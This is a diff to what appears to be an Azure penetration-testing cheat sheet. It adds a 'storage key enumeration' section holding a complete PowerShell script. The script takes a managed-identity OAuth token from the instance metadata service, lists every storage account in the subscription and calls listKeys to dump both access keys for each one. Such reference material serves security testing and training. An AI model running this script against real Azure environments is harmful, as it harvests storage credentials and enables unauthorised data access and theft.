@@ -9,6 +9,7 @@
   * [Administrative-unit Enumeration](#Administrative-unit-enumeration)
   * [App enumeration](#App-enumeration)
   * [Service-principals enumeration](#Service-principals-enumeration)
+  * [storage-key enumeration](#storage key enumeration)
 * [Enumeration using Az powershell](#Enumeration-using-Az-powershell)
   * [Available resources](#Available-resources)
   * [Roles](#Roles)
@@ -361,6 +362,57 @@ Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalOwnedObj
 #### Get objects created by a service principal
 ```
 Get-AzureADServicePrincipal -ObjectId <ID> | Get-AzureADServicePrincipalCreatedObject
+```
+
+### storage key enumeration
+```
+ #---------Get OAuth Token---------#
+    if ($ArmToken -eq ''){
+        $response = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+        $content = $response.Content | ConvertFrom-Json
+        $ArmToken = $content.access_token
+    }
+
+    #---------Query MetaData for SubscriptionID---------#
+    if ($subID -eq ''){
+        $response2 = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+        $subID = ($response2.Content | ConvertFrom-Json).compute.subscriptionId
+    }
+   
+
+    #---------Get List of Storage Accounts and RGs---------#
+    $responseKeys = Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subID,'/providers/Microsoft.Storage/storageAccounts?api-version=2019-06-01')) -Method GET -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing
+    $storageACCTS = ($responseKeys.Content | ConvertFrom-Json).value
+
+
+    # Create data table to house results
+    $TempTbl = New-Object System.Data.DataTable 
+    $TempTbl.Columns.Add("StorageAccount") | Out-Null
+    $TempTbl.Columns.Add("Key1") | Out-Null
+    $TempTbl.Columns.Add("Key2") | Out-Null
+    $TempTbl.Columns.Add("Key1-Permissions") | Out-Null
+    $TempTbl.Columns.Add("Key2-Permissions") | Out-Null
+
+    #---------Request access keys for all storage accounts---------#
+    $storageACCTS | ForEach-Object {
+
+        # Do some split magic on the list of Storage accounts
+        $accountName = $_.name
+        $split1 = ($_.id -split "resourceGroups/")
+        $split2 = ($split1 -Split "/")
+        $SARG = $split2[4]
+
+        #https://docs.microsoft.com/en-us/rest/api/storagerp/storageaccounts/listkeys#
+        $responseKeys = (Invoke-WebRequest -Uri (-join ('https://management.azure.com/subscriptions/',$subID,'/resourceGroups/',$SARG,'/providers/Microsoft.Storage/storageAccounts/',$accountName,'/listKeys?api-version=2019-06-01')) -Method POST -Headers @{ Authorization ="Bearer $ArmToken"} -UseBasicParsing).content
+        $keylist = ($responseKeys| ConvertFrom-Json).keys
+        
+        # Write the keys to the table
+        $TempTbl.Rows.Add($accountName, $keylist[0].value, $keylist[1].value, $keylist[0].permissions, $keylist[1].permissions) | Out-Null
+
+    }
+
+    Write-Output $TempTbl
+
 ```
 
 #### Get group and role memberships of a service principal
